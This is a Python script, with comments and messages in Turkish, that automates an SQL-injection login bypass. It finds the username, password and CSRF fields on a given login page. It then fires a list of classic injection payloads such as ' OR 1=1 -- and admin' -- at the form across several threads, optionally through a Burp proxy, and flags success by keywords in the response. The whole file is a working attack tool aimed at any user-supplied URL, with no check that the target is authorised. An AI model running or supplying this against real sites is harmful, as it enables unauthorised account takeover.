import requests
from bs4 import BeautifulSoup
import threading

# --- Ayarlanabilir değişkenler ---
use_burp = True  # Burp Suite proxy kullanmak için True yap
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} if use_burp else {}
headers = {"User-Agent": "Mozilla/5.0"}
thread_count = 5

# --- Payload listesi ---
payloads = [
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 'a'='a",
    "' OR 1=1 LIMIT 1 --",
    "' OR '' = '",
    "admin' --",
    "' OR 1=1/*",
    "' OR sleep(3)--",
    "' OR 1=1 ORDER BY 1 --"
]

# --- Otomatik form input tespiti ---
def auto_detect_fields(login_url):
    try:
        r = requests.get(login_url, headers=headers, proxies=proxy, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")

        if not form:
            print("[!] Sayfada form bulunamadı.")
            return None

        inputs = form.find_all("input")

        username_field = None
        password_field = None
        csrf_field = None

        for input_tag in inputs:
            input_type = input_tag.get("type", "").lower()
            input_name = input_tag.get("name", "").lower()

            if "user" in input_name or "email" in input_name:
                username_field = input_tag.get("name")
            elif "pass" in input_name:
                password_field = input_tag.get("name")
            elif input_type == "hidden":
                csrf_field = input_tag.get("name")

        print(f"[🧠] Algılanan username input: {username_field}")
        print(f"[🧠] Algılanan password input: {password_field}")
        print(f"[🧠] Algılanan csrf token: {csrf_field}")

        return username_field, password_field, csrf_field

    except Exception as e:
        print(f"[!] Otomatik input algılama başarısız: {e}")
        return None

# --- CSRF Token Alıcı ---
def get_csrf(session, url):
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find("input", {"name": csrf_field})
        return token["value"] if token else ""
    except Exception as e:
        print(f"[!] CSRF token alınamadı: {e}")
        return ""

# --- Login Deneyici ---
def test_payload(url, payload, username_field, password_field):
    session = requests.Session()
    csrf_token = get_csrf(session, url)

    data = {
        username_field: payload,
        password_field: "123456"
    }

    if csrf_token:
        data[csrf_field] = csrf_token

    try:
        response = session.post(url, data=data, headers=headers, proxies=proxy, timeout=10, allow_redirects=True)

        for key in success_keywords:
            if key.lower() in response.text.lower():
                print(f"[✅] Giriş Başarılı! Payload: {payload}")
                print("-" * 40)
                print(response.text[:500])
                return True
    except Exception as ex:
        print(f"[!] Hata: {ex}")
    return False

# --- Thread Worker ---
def worker(url, payloads_chunk, username_field, password_field):
    for p in payloads_chunk:
        print(f"[🔎] Deneniyor: {p}")
        if test_payload(url, p, username_field, password_field):
            break

# --- Threading Fonksiyonu ---
def run_threads(url, payloads, username_field, password_field):
    chunk_size = len(payloads) // thread_count
    threads = []

    for i in range(thread_count):
        chunk = payloads[i * chunk_size: (i + 1) * chunk_size] if i != thread_count - 1 else payloads[i * chunk_size:]
        t = threading.Thread(target=worker, args=(url, chunk, username_field, password_field))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# --- Başlangıç Noktası ---
if __name__ == "__main__":
    url_input = input("[🌐] Login formun tam URL’sini girin: ").strip()
    
    print("[⚙️] URL tespit ediliyor...")
    detected = auto_detect_fields(url_input)
    
    if detected:
        username_field, password_field, csrf_field = detected
        success_keywords = ["dashboard", "admin", "çıkış", "hoşgeldin"]
        print("[✅] Form inputları başarıyla tespit edildi.")
    else:
        print("[!] Form inputları otomatik tespit edilemedi. Manuel giriş yapmanız gerekebilir.")
        username_field = input("Kullanıcı adı input name: ").strip()
        password_field = input("Şifre input name: ").strip()
        csrf_field = input("CSRF input name (yoksa boş bırak): ").strip() or None
        success_keywords = ["dashboard", "admin", "çıkış", "hoşgeldin"]

        print(f"[⚙️] {len(payloads)} payload deneniyor, {thread_count} thread ile...")
    run_threads(url_input, payloads, username_field, password_field)
